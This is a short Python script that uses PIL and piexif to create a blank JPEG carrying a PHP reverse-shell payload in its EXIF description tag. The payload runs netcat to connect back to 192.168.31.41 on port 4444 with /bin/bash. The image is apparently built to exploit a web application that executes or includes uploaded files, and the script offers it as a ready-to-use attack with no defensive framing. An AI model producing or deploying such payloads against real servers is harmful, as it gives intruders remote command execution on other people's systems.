from PIL import Image
import piexif

# Create a blank image (e.g., 200x200 pixels with a white background)
image = Image.new('RGB', (200, 200), 'white')

# Define the EXIF data
exif_dict = {
    "0th": {
        270: "<?php system('nc 192.168.31.41 4444 -e /bin/bash'); __halt_compiler(); ?>"
    },
    "Exif": {},
    "GPS": {},
    "1st": {}
}

# Convert the EXIF data to bytes
exif_bytes = piexif.dump(exif_dict)

# Save the image with the EXIF data
image.save("Exif.jpg", exif=exif_bytes)

print("Image generated with EXIF metadata.")
